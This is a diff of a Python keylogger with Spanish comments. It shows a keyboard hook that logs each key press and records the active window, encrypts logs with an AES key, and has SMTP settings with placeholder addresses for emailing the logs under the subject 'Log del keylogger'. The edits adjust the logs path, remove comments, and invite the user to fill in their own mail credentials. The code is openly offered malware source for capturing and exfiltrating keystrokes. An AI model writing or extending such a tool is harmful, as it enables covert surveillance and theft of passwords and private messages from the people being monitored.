@@ -8,8 +8,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-# Configuración
-LOGS_DIR = "logs"
+# Configuración (rellenar con tus datos, obviamente no voy a subir los mios a github)
+LOGS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "logs")
 EMAIL_FROM = "tu_correo@example.com"
 EMAIL_TO = "destinatario@example.com"
 EMAIL_SUBJECT = "Log del keylogger"
@@ -17,12 +17,8 @@ SMTP_SERVER = "smtp.example.com"
 SMTP_PORT = 587
 SMTP_USER = "tu_correo@example.com"
 SMTP_PASSWORD = "tu_contraseña"
-
-# Crear carpeta de logs si no existe
 if not os.path.exists(LOGS_DIR):
     os.makedirs(LOGS_DIR)
-
-# Obtener clave AES segura
 key, _ = get_or_create_key()
 
 def get_active_window():
@@ -97,7 +93,7 @@ if __name__ == "__main__":
     logging.debug("Starting keylogger")
     try:
         keyboard.on_press(log_key)
-        keyboard.wait()  # Mantener el programa en ejecución
+        keyboard.wait()
     except Exception as e:
         logging.error(f"Unhandled exception: {e}")
     logging.debug("Keylogger stopped")
